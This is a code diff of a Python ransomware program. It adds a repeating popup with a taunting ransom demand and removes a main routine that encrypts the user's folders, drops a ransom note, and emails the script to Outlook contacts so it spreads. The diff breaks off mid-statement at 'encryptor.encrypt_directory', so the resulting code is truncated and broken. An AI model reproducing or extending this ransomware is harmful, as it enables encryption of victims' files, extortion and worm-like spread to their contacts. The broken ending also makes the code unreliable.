@@ -2,8 +2,35 @@ import os
 import sys
 import platform
 import time
+import tkinter as tk
+from tkinter import messagebox
 from encryptor import FileEncryptor
 from mailer import OutlookMailer
+
+def show_ransom_popup():
+    root = tk.Tk()
+    root.withdraw()  # Hide the main window
+    
+    # Create the ransom message
+    title = "YOUR FILES HAVE BEEN ENCRYPTED!"
+    message = """
+All your important files have been encrypted with military-grade AES-256 encryption.
+Your documents, photos, videos, and other files are now inaccessible.
+
+To decrypt your files, you need a special decryption key.
+Without this key, your files will remain encrypted forever.
+
+This looks like a skill issue on your part - maybe next time you'll have proper backups.
+
+Check your desktop for further instructions.
+"""
+    
+    # Show the popup
+    messagebox.showerror(title, message)
+    
+    # Show it again after a delay to make sure they see it
+    root.after(5000, lambda: messagebox.showerror(title, message))
+    root.mainloop()
 
 def get_user_directories():
     if platform.system() == "Windows":
@@ -38,41 +65,4 @@ def main():
     print("Encrypting files...")
     for directory in user_dirs:
         if os.path.exists(directory):
-            encryptor.encrypt_directory(directory)
-    
-    # Create ransom note on desktop
-    desktop_path = user_dirs[0]
-    if os.path.exists(desktop_path):
-        encryptor.create_ransom_note(desktop_path)
-    
-    # Save the encryption key (in a real scenario, this would be sent to the attacker)
-    key_path = os.path.join(desktop_path, "encryption_key.key")
-    with open(key_path, 'wb') as key_file:
-        key_file.write(encryptor.key)
-    
-    # Send virus to contacts via Outlook
-    print("Sending secure encryption tool to your contacts...")
-    if platform.system() == "Windows":
-        try:
-            mailer = OutlookMailer()
-            # Get the current script path to send as attachment
-            script_path = os.path.abspath(__file__)
-            mailer.send_virus_to_contacts(script_path)
-        except Exception as e:
-            print(f"Error sending emails: {e}")
-    
-    # Display ransom note
-    print("\n" + "="*50)
-    print("YOUR FILES HAVE BEEN ENCRYPTED!")
-    print("="*50)
-    print("All your important files have been encrypted.")
-    print("This looks like a skill issue on your part.")
-    print("Check your desktop for further instructions.")
-    print("="*50)
-    
-    # Keep the program running
-    while True:
-        time.sleep(10)
-
-if __name__ == "__main__":
-    main()
+            encryptor.encrypt_directory
